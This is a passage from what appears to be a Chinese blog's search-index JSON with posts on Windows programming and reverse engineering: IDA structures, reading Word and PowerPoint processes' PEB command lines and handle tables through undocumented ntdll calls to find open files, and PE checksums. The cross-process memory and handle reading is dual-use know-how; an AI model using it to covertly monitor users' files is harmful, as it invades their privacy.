cout&lt;&lt;&quot;子网地址：&quot;&lt;&lt;pIpAddrString-&gt;IpMask.String&lt;&lt;endl; cout&lt;&lt;&quot;网关地址：&quot;&lt;&lt;pIpAdapterInfo-&gt;GatewayList.IpAddress.String&lt;&lt;endl; pIpAddrString=pIpAddrString-&gt;Next; &#125; while (pIpAddrString); pIpAdapterInfo = pIpAdapterInfo-&gt;Next; cout&lt;&lt;&quot;--------------------------------------------------------------------&quot;&lt;&lt;endl; &#125; &#125; //释放内存空间 if (pIpAdapterInfo) &#123; delete pIpAdapterInfo; &#125; return 0; &#125;","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"IDA创建结构体","slug":"逆向/IDA创建结构体","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:34:42.222Z","comments":true,"path":"2018/04/12/逆向/IDA创建结构体/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E9%80%86%E5%90%91/IDA%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/","excerpt":"1.在IDA中打开Structures，快捷键是shifr+ F9 ,然后按insert键，进行插入 2.在ends 后按d键，添加相应的成员，然后选中成员名，按N进行修改，选中类型，按d 进行更改类型，构造完结构题以后，回到代码窗口 3 在代码窗口找到相应的变量，右键选择Convert to struct ，然后选择刚刚你定义的结构体即可。","text":"1.在IDA中打开Structures，快捷键是shifr+ F9 ,然后按insert键，进行插入 2.在ends 后按d键，添加相应的成员，然后选中成员名，按N进行修改，选中类型，按d 进行更改类型，构造完结构题以后，回到代码窗口 3 在代码窗口找到相应的变量，右键选择Convert to struct ，然后选择刚刚你定义的结构体即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"获取打开文件的全路径（1）","slug":"编程/获取打开的文件的全路径（1）","date":"2018-04-11T16:00:00.000Z","updated":"2024-03-12T11:12:19.677Z","comments":true,"path":"2018/04/12/编程/获取打开的文件的全路径（1）/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E7%BC%96%E7%A8%8B/%E8%8E%B7%E5%8F%96%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E8%B7%AF%E5%BE%84%EF%BC%881%EF%BC%89/","excerpt":"1、获取打开文件的全路径（1）方法：获取进程PEB中的命令行参数信息（问题：如果先打开文件比如word.exe再打开文件，会出现获取不到的情况）步骤： 遍历进程获取打开文件的可执行文件的进程 HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”)| !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, false, ProcessEntry.th32ProcessID); do something CloseHandle(hProcess); } } while (Process32NextW(hSnapProcess, &amp;ProcessEntry)); 利用ntdll.dll中一个未公开的函数NtQueryInformationProcess，获取进程信息然后去读对方进程ReadProcessMemory,函数原型如下： NTSTATUS WINAPI NtQueryInformationProcess( In HANDLE ProcessHandle, In PROCESSINFOCLASS ProcessInformationClass, Out PVOID ProcessInformation, In ULONG ProcessInformationLength, Out_opt PULONG ReturnLength ); 第一个参数是进程句柄，第二个参数是获取的进程的信息类型，这里我们选择ProcessBasicInformation,msdn 的声明如下，会返回一个PEB结构体。 第三个参数是输出参数，当参数2是ProcessBasicInformation时，会返回一个PROCESS_BASIC_INFORMATION 结构，结构如下， status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), &amp;ReturnLength); 获取到PROCESS_BASIC_INFORMATION结构体以后，由上可以看出的它的第二个成员就是指向进程PEB结构体的指针，此时调用ReadProcessMemory，获取进程PEB， ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), 0) ReadProcessMemory的函数原型如下： BOOL WINAPI ReadProcessMemory( In HANDLE hProcess, In LPCVOID lpBaseAddress, Out LPVOID lpBuffer, In SIZE_T nSize, Out SIZE_T *lpNumberOfBytesRead ); 通过ReadProcessMemory 获取进程的PEB以后，PEB的结构如下： typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PVOID* KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PVOID* ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PVOID* *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB; 如图标红位置为进程的参数信息，再次调用ReadProcessMemory 获取参数信息，ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;upps, sizeof(RTL_USER_PROCESS_PARAMETERS), 0)) 其中upps是一个RTL_USER_PROCESS_PARAMETERS 的结构体，定义如下： typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength; ULONG Length;","text":"1、获取打开文件的全路径（1）方法：获取进程PEB中的命令行参数信息（问题：如果先打开文件比如word.exe再打开文件，会出现获取不到的情况）步骤： 遍历进程获取打开文件的可执行文件的进程 HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”)| !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, false, ProcessEntry.th32ProcessID); do something CloseHandle(hProcess); } } while (Process32NextW(hSnapProcess, &amp;ProcessEntry)); 利用ntdll.dll中一个未公开的函数NtQueryInformationProcess，获取进程信息然后去读对方进程ReadProcessMemory,函数原型如下： NTSTATUS WINAPI NtQueryInformationProcess( In HANDLE ProcessHandle, In PROCESSINFOCLASS ProcessInformationClass, Out PVOID ProcessInformation, In ULONG ProcessInformationLength, Out_opt PULONG ReturnLength ); 第一个参数是进程句柄，第二个参数是获取的进程的信息类型，这里我们选择ProcessBasicInformation,msdn 的声明如下，会返回一个PEB结构体。 第三个参数是输出参数，当参数2是ProcessBasicInformation时，会返回一个PROCESS_BASIC_INFORMATION 结构，结构如下， status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), &amp;ReturnLength); 获取到PROCESS_BASIC_INFORMATION结构体以后，由上可以看出的它的第二个成员就是指向进程PEB结构体的指针，此时调用ReadProcessMemory，获取进程PEB， ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), 0) ReadProcessMemory的函数原型如下： BOOL WINAPI ReadProcessMemory( In HANDLE hProcess, In LPCVOID lpBaseAddress, Out LPVOID lpBuffer, In SIZE_T nSize, Out SIZE_T *lpNumberOfBytesRead ); 通过ReadProcessMemory 获取进程的PEB以后，PEB的结构如下： typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PVOID* KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PVOID* ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PVOID* *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB; 如图标红位置为进程的参数信息，再次调用ReadProcessMemory 获取参数信息，ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;upps, sizeof(RTL_USER_PROCESS_PARAMETERS), 0)) 其中upps是一个RTL_USER_PROCESS_PARAMETERS 的结构体，定义如下： typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; HANDLE ConsoleHandle; ULONG ConsoleFlags; HANDLE StandardInput; HANDLE StandardOutput; HANDLE StandardError; CURDIR CurrentDirectory; UNICODE_STRING DllPath; UNICODE_STRING ImagePathName; UNICODE_STRING CommandLine; PVOID Environment; ULONG StartingX; ULONG StartingY; ULONG CountX; ULONG CountY; ULONG CountCharsX; ULONG CountCharsY; ULONG FillAttribute; ULONG WindowFlags; ULONG ShowWindowFlags; UNICODE_STRING WindowTitle; UNICODE_STRING DesktopInfo; UNICODE_STRING ShellInfo; UNICODE_STRING RuntimeData; RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS]; ULONG EnvironmentSize; ULONG EnvironmentVersion; PVOID PackageDependencyData; //8+ ULONG ProcessGroupId; // ULONG LoaderThreads; &#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS; 如上标红位置为命令行信息，UNICODE_STRING同样是一个结构体，定义如下： typedef struct _UNICODE_STRING &#123; USHORT Length; USHORT MaximumLength; PWSTR Buffer; &#125; UNICODE_STRING; typedef UNICODE_STRING *PUNICODE_STRING; 再次调用ReadProcessMemory获取命令行字符串信息，存入buffer中 ReadProcessMemory(hProcess, upps.CommandLine.Buffer, buffer, upps.CommandLine.Length, 0); 到这完整的进程命令行信息就获取到了。通过字符串处理就可以得到相应的打开的文件的全路径了 。","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"获取打开的文件的全路径（2）","slug":"编程/获取打开的文件的全路径（2)","date":"2018-04-11T16:00:00.000Z","updated":"2024-03-12T11:12:29.521Z","comments":true,"path":"2018/04/12/编程/获取打开的文件的全路径（2)/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E7%BC%96%E7%A8%8B/%E8%8E%B7%E5%8F%96%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E8%B7%AF%E5%BE%84%EF%BC%882)/","excerpt":"1、获取打开文件的全路径（2）搜索进程空间中的所有句柄，获取句柄的文件名即可。 首先遍历进程寻找打开文件的进程，比如 word.exe 和PowerPoint.exe HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return 1; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”) | !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { ……. } 寻找到目标进程以后，获取进程中的句柄 这里利用了未文档化的一个函数 ZwQuerySystemInformation，这是ntdll.dll中的函数 HMODULE hNtDLL = LoadLibrary(L&quot;NTDLL.DLL&quot;); if (!hNtDLL) &#123; return 1; &#125; ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtDLL, &quot;ZwQuerySystemInformation&quot;); typedef NTSTATUS(WINAPI *ZWQUERYSYSTEMINFORMATION)(unsigned long, PVOID, ULONG, PULONG); ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation; 函数原型如下： NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); SYSTEM_INFORMATION_CLASS结构体如下： typedef enum _SYSTEMINFOCLASS &#123; SystemBasicInformation, // 0x002C SystemProcessorInformation, // 0x000C SystemPerformanceInformation, // 0x0138 SystemTimeInformation, // 0x0020 SystemPathInformation, // not implemented SystemProcessInformation, // 0x00C8+ per process SystemCallInformation, // 0x0018 + (n * 0x0004) SystemConfigurationInformation, // 0x0018 SystemProcessorCounters, // 0x0030 per cpu SystemGlobalFlag, // 0x0004 (fails if size != 4) SystemCallTimeInformation, // not implemented SystemModuleInformation, // 0x0004 + (n * 0x011C) SystemLockInformation, // 0x0004 + (n * 0x0024) SystemStackTraceInformation, // not implemented SystemPagedPoolInformation, // checked build only SystemNonPagedPoolInformation, // checked build only SystemHandleInformation, // 0x0004 + (n * 0x0010) SystemObjectTypeInformation, // 0x0038+ + (n * 0x0030+) SystemPageFileInformation, // 0x0018+ per page file SystemVdmInstemulInformation, // 0x0088 SystemVdmBopInformation, // invalid info class SystemCacheInformation, // 0x0024 SystemPoolTagInformation, // 0x0004 + (n * 0x001C) SystemInterruptInformation, // 0x0000, or 0x0018 per cpu SystemDpcInformation, // 0x0014 SystemFullMemoryInformation, // checked build only SystemLoadDriver, // 0x0018, set mode only SystemUnloadDriver, // 0x0004, set mode only SystemTimeAdjustmentInformation, // 0x000C, 0x0008 writeable SystemSummaryMemoryInformation, // checked build only SystemNextEventIdInformation, // checked build only SystemEventIdsInformation, // checked build only SystemCrashDumpInformation, // 0x0004 SystemExceptionInformation, // 0x0010 SystemCrashDumpStateInformation, // 0x0004 SystemDebuggerInformation, // 0x0002 SystemContextSwitchInformation, // 0x0030 SystemRegistryQuotaInformation, // 0x000C SystemAddDriver, // 0x0008, set mode only SystemPrioritySeparationInformation,// 0x0004, set mode only SystemPlugPlayBusInformation, // not implemented SystemDockInformation, // not implemented SystemPowerInfo, // 0x0060 (XP only!) SystemProcessorSpeedInformation, // 0x000C (XP only!) SystemTimeZoneInformation, // 0x00AC SystemLookasideInformation, // n * 0x0020 SystemSetTimeSlipEvent, SystemCreateSession, // set mode only SystemDeleteSession, // set mode only SystemInvalidInfoClass1, // invalid info class SystemRangeStartInformation, // 0x0004 (fails if size != 4) SystemVerifierInformation, SystemAddVerifier, SystemSessionProcessesInformation, // checked build only MaxSystemInfoClass &#125; SYSTEMINFOCLASS, *PSYSTEMINFOCLASS;","text":"1、获取打开文件的全路径（2）搜索进程空间中的所有句柄，获取句柄的文件名即可。 首先遍历进程寻找打开文件的进程，比如 word.exe 和PowerPoint.exe HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return 1; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”) | !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { ……. } 寻找到目标进程以后，获取进程中的句柄 这里利用了未文档化的一个函数 ZwQuerySystemInformation，这是ntdll.dll中的函数 HMODULE hNtDLL = LoadLibrary(L&quot;NTDLL.DLL&quot;); if (!hNtDLL) &#123; return 1; &#125; ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtDLL, &quot;ZwQuerySystemInformation&quot;); typedef NTSTATUS(WINAPI *ZWQUERYSYSTEMINFORMATION)(unsigned long, PVOID, ULONG, PULONG); ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation; 函数原型如下： NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); SYSTEM_INFORMATION_CLASS结构体如下： typedef enum _SYSTEMINFOCLASS &#123; SystemBasicInformation, // 0x002C SystemProcessorInformation, // 0x000C SystemPerformanceInformation, // 0x0138 SystemTimeInformation, // 0x0020 SystemPathInformation, // not implemented SystemProcessInformation, // 0x00C8+ per process SystemCallInformation, // 0x0018 + (n * 0x0004) SystemConfigurationInformation, // 0x0018 SystemProcessorCounters, // 0x0030 per cpu SystemGlobalFlag, // 0x0004 (fails if size != 4) SystemCallTimeInformation, // not implemented SystemModuleInformation, // 0x0004 + (n * 0x011C) SystemLockInformation, // 0x0004 + (n * 0x0024) SystemStackTraceInformation, // not implemented SystemPagedPoolInformation, // checked build only SystemNonPagedPoolInformation, // checked build only SystemHandleInformation, // 0x0004 + (n * 0x0010) SystemObjectTypeInformation, // 0x0038+ + (n * 0x0030+) SystemPageFileInformation, // 0x0018+ per page file SystemVdmInstemulInformation, // 0x0088 SystemVdmBopInformation, // invalid info class SystemCacheInformation, // 0x0024 SystemPoolTagInformation, // 0x0004 + (n * 0x001C) SystemInterruptInformation, // 0x0000, or 0x0018 per cpu SystemDpcInformation, // 0x0014 SystemFullMemoryInformation, // checked build only SystemLoadDriver, // 0x0018, set mode only SystemUnloadDriver, // 0x0004, set mode only SystemTimeAdjustmentInformation, // 0x000C, 0x0008 writeable SystemSummaryMemoryInformation, // checked build only SystemNextEventIdInformation, // checked build only SystemEventIdsInformation, // checked build only SystemCrashDumpInformation, // 0x0004 SystemExceptionInformation, // 0x0010 SystemCrashDumpStateInformation, // 0x0004 SystemDebuggerInformation, // 0x0002 SystemContextSwitchInformation, // 0x0030 SystemRegistryQuotaInformation, // 0x000C SystemAddDriver, // 0x0008, set mode only SystemPrioritySeparationInformation,// 0x0004, set mode only SystemPlugPlayBusInformation, // not implemented SystemDockInformation, // not implemented SystemPowerInfo, // 0x0060 (XP only!) SystemProcessorSpeedInformation, // 0x000C (XP only!) SystemTimeZoneInformation, // 0x00AC SystemLookasideInformation, // n * 0x0020 SystemSetTimeSlipEvent, SystemCreateSession, // set mode only SystemDeleteSession, // set mode only SystemInvalidInfoClass1, // invalid info class SystemRangeStartInformation, // 0x0004 (fails if size != 4) SystemVerifierInformation, SystemAddVerifier, SystemSessionProcessesInformation, // checked build only MaxSystemInfoClass &#125; SYSTEMINFOCLASS, *PSYSTEMINFOCLASS; 这个结构再MSDN上只列举了一部分，这是网上搜索的结构，可以访问http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/query.htm查看详细的信息，其包含了我们所需要的一个参数SystemHandleInformation 用来获取系统中进程的句柄信息，第二个参数是缓冲区指针，第三个参数是大小，最后一个参数是实际的返回的数据大小。传入SystemHandleInformation 将会返回一个SYSTEM_HANDLE_INFORMATION结构，结构如下： typedef struct _SYSTEM_HANDLE_INFORMATION &#123; ULONG uCount; SYSTEM_HANDLE aSH[]; &#125; SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION; typedef struct _SYSTEM_HANDLE &#123; ULONG uIdProcess; UCHAR ObjectType; // OB_TYPE_* (OB_TYPE_TYPE, etc.) UCHAR Flags; // HANDLE_FLAG_* (HANDLE_FLAG_INHERIT, etc.) USHORT Handle; PVOID pObject; ACCESS_MASK GrantedAccess; &#125; SYSTEM_HANDLE, *PSYSTEM_HANDLE; 查找句柄对应的进程，获取句柄对应的文件名 通过查询返回句柄的进程pid与传入的PID比较。若符合，OpenProcess 打开该进程，DuplicateHanle复制句柄，然后获取句柄的文件名，然后相对路径转换为绝对路径。获取句柄的详细信息用到了ZwQueryInformationFile 函数，这个函数同样是一个未文档化的函数， HMODULE hNtDLL = LoadLibrary(L&quot;NTDLL.DLL&quot;); if (!hNtDLL) &#123; return 1; &#125; ZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtDLL, &quot;ZwQueryInformationFile&quot;); typedef NTSTATUS(WINAPI *ZWQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID,ULONG, FILE_INFORMATION_CLASS); ZWQUERYINFORMATIONFILE ZwQueryInformationFile; NTSTATUS ZwQueryInformationFile( IN HANDLE FileHandle, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass ); 第一个参数是文件句柄，第二个参数是接收最终完成状态的IO_STATUS_BLOCK结构的指针。第三个参数是存储返回的文件对象的信息，第四个参数是缓冲区大小，第五个参数是文件信息的类型，我们传入FileNameInformation。在这里我们定义了一个结构体 PNM_INFO ，用来存储信息 typedef struct _NM_INFO &#123; HANDLE hFile; FILE_NAME_INFORMATION Info; WCHAR Name[MAX_PATH]; &#125; NM_INFO, *PNM_INFO; 第三个成员即为文件名包括路径，不过是相对路径，调用 PathResolve 获取绝对路径。到此文件的全路径就获取到了。","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"PE Checksum","slug":"逆向/PE Checksum","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:37:18.770Z","comments":true,"path":"2018/04/12/逆向/PE Checksum/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E9%80%86%E5%90%91/PE%20Checksum/","excerpt":"1.check 介绍PE文件可选头结构如下，其中有个成员是checksum ，其在编译以后生成一个校验和，所有驱动、系统启动时加载的DLL、系统关键进程加载的DLL都要进行校验和的校验，查看是否有改动，这个检验和可以通过API进行计算，CheckSumMappedFile 或者直接 MapFileAndCheckSum，计算算法比较简单如下： 因为要计算整个文件数据嘛，所以开始这个字段的数据要先置0； 从文件头开始，每次读一个字（WORD），进行带进位的累加（ADC），超出WORD部分自动溢出； 将前面的累加和再加上PE文件的长度，结果就是这个校验和了 2 测试代码如下：#include&quot;stdafx.h&quot; #include &lt;windows.h&gt; #include&lt;ImageHlp.h&gt; #pragma comment(lib,&quot;ImageHlp.lib&quot;) ​ void main() &#123; DWORD HeaderCheckSum = 0; //PE头里的校验值 DWORD CheckSum = 0; //计算下来的校验值 MapFileAndCheckSum(L&quot;D:\\\\newupdate.exe&quot;, &amp;HeaderCheckSum, &amp;CheckSum); if (CheckSum == HeaderCheckSum) &#123; MessageBox(NULL, L&quot;相等&quot;, NULL, 0); &#125; &#125; 附PE可选头结构typedef struct _IMAGE_OPTIONAL_HEADER{ &#x2F;&#x2F; &#x2F;&#x2F; Standard fields. &#x2F;&#x2F;+18h WORD Magic; &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）+1Ah BYTE MajorLinkerVersion; &#x2F;&#x2F; 链接程序的主版本号+1Bh BYTE MinorLinkerVersion; &#x2F;&#x2F; 链接程序的次版本号+1Ch DWORD SizeOfCode; &#x2F;&#x2F; 所有含代码的节的总大小+20h DWORD SizeOfInitializedData; &#x2F;&#x2F; 所有含已初始化数据的节的总大小+24h DWORD SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小+28h DWORD AddressOfEntryPoint; &#x2F;&#x2F; 程序执行入口RVA+2Ch DWORD BaseOfCode; &#x2F;&#x2F; 代码的区块的起始RVA+30h DWORD BaseOfData; &#x2F;&#x2F; 数据的区块的起始RVA &#x2F;&#x2F; &#x2F;&#x2F; NT additional fields. 以下是属于NT结构增加的领域。 &#x2F;&#x2F;+34h DWORD ImageBase; &#x2F;&#x2F; 程序的首选装载地址+38h DWORD SectionAlignment; &#x2F;&#x2F; 内存中的区块的对齐大小+3Ch DWORD FileAlignment; &#x2F;&#x2F; 文件中的区块的对齐大小+40h WORD MajorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的主版本号+42h WORD MinorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的副版本号+44h WORD MajorImageVersion; &#x2F;&#x2F; 可运行于操作系统的主版本号+46h WORD MinorImageVersion; &#x2F;&#x2F; 可运行于操作系统的次版本号+48h WORD MajorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的主版本号+4Ah WORD MinorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的次版本号+4Ch DWORD Win32VersionValue; &#x2F;&#x2F; 莫须有字段，不被病毒利用的话一般为0+50h DWORD SizeOfImage; &#x2F;&#x2F; 映像装入内存后的总尺寸+54h DWORD SizeOfHeaders; &#x2F;&#x2F; 所有头 + 区块表的尺寸大小+58h DWORD CheckSum; &#x2F;&#x2F; 映像的校检和+5Ch WORD Subsystem; &#x2F;&#x2F; 可执行文件期望的子系统+5Eh WORD DllCharacteristics; &#x2F;&#x2F; DllMain()函数何时被调用，默认为 0+60h DWORD SizeOfStackReserve; &#x2F;&#x2F; 初始化时的栈大小+64h DWORD SizeOfStackCommit; &#x2F;&#x2F; 初始化时实际提交的栈大小+68h DWORD SizeOfHeapReserve; &#x2F;&#x2F; 初始化时保留的堆大小+6Ch DWORD SizeOfHeapCommit; &#x2F;&#x2F; 初始化时实际提交的堆大小+70h DWORD LoaderFlags; &#x2F;&#x2F; 与调试有关，默认为 0+74h DWORD NumberOfRvaAndSizes; &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来 &#x2F;&#x2F; 一直是16+78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; &#x2F;&#x2F; 数据目录表} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;","text":"1.check 介绍PE文件可选头结构如下，其中有个成员是checksum ，其在编译以后生成一个校验和，所有驱动、系统启动时加载的DLL、系统关键进程加载的DLL都要进行校验和的校验，查看是否有改动，这个检验和可以通过API进行计算，CheckSumMappedFile 或者直接 MapFileAndCheckSum，计算算法比较简单如下： 因为要计算整个文件数据嘛，所以开始这个字段的数据要先置0； 从文件头开始，每次读一个字（WORD），进行带进位的累加（ADC），超出WORD部分自动溢出； 将前面的累加和再加上PE文件的长度，结果就是这个校验和了 2 测试代码如下：#include&quot;stdafx.h&quot; #include &lt;windows.h&gt; #include&lt;ImageHlp.h&gt; #pragma comment(lib,&quot;ImageHlp.lib&quot;) ​ void main() &#123; DWORD HeaderCheckSum = 0; //PE头里的校验值 DWORD CheckSum = 0; //计算下来的校验值 